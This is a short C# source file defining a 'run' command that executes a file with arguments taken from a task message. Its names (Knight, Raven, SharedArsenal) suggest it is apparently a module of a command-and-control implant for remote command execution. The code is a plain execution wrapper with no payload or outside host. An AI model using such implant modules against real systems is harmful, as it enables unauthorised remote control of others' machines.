using Internal = SharedArsenal.Internal;
using Knight.Models.Raven;
using System.Linq;

namespace Knight.Commands
{
    public class Run : KnightCommand
    {
        public override string Name => "run";

        public override string Execute(TaskMessage task)
        {
            var fileName = task.Arguments[0];
            var args = string.Join(" ", task.Arguments.Skip(1));

            return Internal.Execute.ExecuteCommand(fileName, args);
        }
    }
}